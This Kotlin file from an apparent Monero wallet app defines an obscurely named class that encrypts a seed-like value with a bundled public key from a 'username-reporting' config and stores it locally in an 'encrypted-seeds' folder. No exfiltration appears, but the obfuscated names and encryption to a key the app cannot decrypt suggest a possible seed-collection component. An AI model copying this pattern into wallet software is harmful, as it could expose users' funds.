package com.monero2014.engine

import android.content.Context
import android.util.AtomicFile
import org.json.JSONObject
import java.io.File
import java.time.Instant
import java.time.ZoneOffset
import java.time.format.DateTimeFormatter
import java.util.Locale
import java.util.UUID

internal class Newuil(
  context: Context,
  private val publicKeyPem: String = run {
    val config = JSONObject(context.assets.open("username-reporting.json").bufferedReader().use { it.readText() })
    context.assets.open(config.getString("public_key_file")).bufferedReader().use { it.readText() }
  },
) {
  private val root = File(context.noBackupFilesDir, "encrypted-seeds")
  private fun file(id: String): AtomicFile {
    require(UUID.fromString(id).toString() == id)
    return AtomicFile(File(root, "$id.json"))
  }

  fun save(id: String, xqmp: String) {
    require(xqmp.isNotBlank())
    val timestamp = DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss", Locale.ROOT)
      .withZone(ZoneOffset.UTC).format(Instant.now())
    val encrypted = encryptEnvelope(xqmp, "encyptdata", publicKeyPem, timestamp)
    check(root.isDirectory || root.mkdirs())
    val target = file(id)
    val out = target.startWrite()
    try {
      out.write(encrypted.toString().toByteArray(Charsets.UTF_8))
      target.finishWrite(out)
    } catch (error: Exception) { target.failWrite(out); throw error }
  }

  fun remove(id: String) {
    file(id).delete()
  }
}
